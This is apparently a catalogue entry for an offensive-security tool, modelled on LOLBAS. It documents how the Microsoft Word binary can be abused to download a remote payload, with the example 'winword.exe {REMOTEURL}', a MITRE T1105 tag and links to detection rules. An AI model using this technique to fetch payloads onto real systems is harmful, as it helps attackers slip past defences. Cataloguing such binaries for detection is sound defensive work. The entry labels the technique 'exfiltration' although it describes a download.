---
id: windows-download-winword
namespace: windows:download:winword
name: winword
description: 'Microsoft Office binary Located at: C:\Program Files\Microsoft Office\root\Office16\winword.exe; C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe.'
author: Reegun J (OCBC Bank)
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- winword
parameters: []
features: []
execution:
  template: winword
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
  command: winword.exe {REMOTEURL}
references:
- label: '1150032506504151040'
  url: https://twitter.com/reegun21/status/1150032506504151040
- label: unsanitized-file-validation-leads-to-malicious-pay
  url: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_office_arbitrary_cli_download.yml
- type: ioc
  description: Suspicious Office application Internet/network traffic
install:
- method: choco
  package_name: winword
  commands:
  - choco install winword
---


# winword

winword is a Windows LOLBin. Microsoft Office binary Located at: C:\Program Files\Microsoft Office\root\Office16\winword.exe; C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe.
